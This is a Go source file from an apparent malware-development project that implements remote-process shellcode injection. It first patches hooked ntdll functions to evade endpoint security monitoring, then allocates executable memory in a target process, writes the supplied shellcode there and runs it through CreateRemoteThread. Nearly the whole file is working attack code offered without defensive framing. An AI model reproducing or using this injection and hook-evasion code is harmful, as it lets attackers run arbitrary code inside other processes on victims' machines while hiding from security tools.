package process_injection

import (
	"fmt"
	"github.com/osonkr/malware-development/win32"
	"log"
	"syscall"
	"unsafe"
)

func patchApiCalls(apis ...string) {
	for _, api := range apis {
		err := win32.UnHookedAPI(api)
		if err != nil {
			fmt.Println(err)
		}
	}
}

// Inject will attempt to inject a byte array into a new region of memory
// in the process provided. It will then create a remote thread at the given base address
// of the new memory region, wait for thread to exit and attempt to clean up
// memory.
func Inject(data []byte, handle win32.HANDLE) {
	buf := append(data, byte(0))
	size := len(buf)

	// Rather than using syscalls, we will just check if the api's are hooked and if so patch them
	// with correct instructions
	patchApiCalls(
		"NtAllocateVirtualMemory",
		"NtWriteVirtualMemory",
		"NtCreateThread",
		"NtQueryInformationThread",
		"NtWaitForSingleObject",
		"NtFreeVirtualMemory",
		)

	// 1. Create New Region of Memory in Remote Process
	var null win32.NULL_REF
	baseAddr, err := win32.VirtualAllocEx(
		handle,
		uintptr(null),
		uintptr(size),
		win32.MEM_COMMIT | win32.MEM_RESERVE,
		win32.PAGE_EXECUTE_READ,
		)

	if err != nil {
		log.Fatalf("unable to allocate memory to process: %s", err)
	}

	fmt.Printf("[*] Allocated %d bytes to memory address: %v\n", size, unsafe.Pointer(baseAddr))

	// 2. Write to Memory
	var bWritten *byte

	if err = win32.WriteProcessMemory(
		handle,
		baseAddr,
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(len(buf)),
		uintptr(unsafe.Pointer(bWritten)),
		); err != nil {
		log.Fatalf("unable to write to memory: %s", err)
	}

	fmt.Printf("[*] Wrote shellcode to memory\n")

	// 3. Create Remote Thread at baseAddr
	var threadAttrs win32.SECURITY_ATTRIBUTES
	remoteThread, err := win32.CreateRemoteThread(
		handle,
		&threadAttrs,
		0,
		baseAddr,
		0,
		0,
		0,
		)

	if err != nil {
		log.Fatalf("unable to create remote thread: %s\n", err)
	}

	fmt.Printf("[*] Remote thread created: %v\n", unsafe.Pointer(remoteThread))

	// 4. Verify Injection with WaitForSingleObject
	_, err = win32.WaitForSingleObject(remoteThread, syscall.INFINITE)
	if err != nil {
		log.Fatalf("unable to get thread wait state: %s\n", err)
	}

	// 5. Check exit code from thread
	exitCode, err := win32.GetExitCodeThread(remoteThread)
	if err != nil {
		log.Fatalf("was not able to get exit code from thread: %s\n", err)
	}

	if exitCode != 0 {
		log.Fatalf("thread closed with exit code: %d\n", exitCode)
	}

	// 6. Close handle to remote thread
	if err = win32.CloseHandle(remoteThread); err != nil {
		log.Fatalf("unable to close remote thread handle: %s\n", err)
	}

	// 7. Free up used memory
	if err = win32.VirtualFreeEx(handle, baseAddr, uintptr(size), win32.MEM_RELEASE); err != nil {
		log.Fatalf("was not able to free up memory after thread usage: %s\n", err)
	}
}
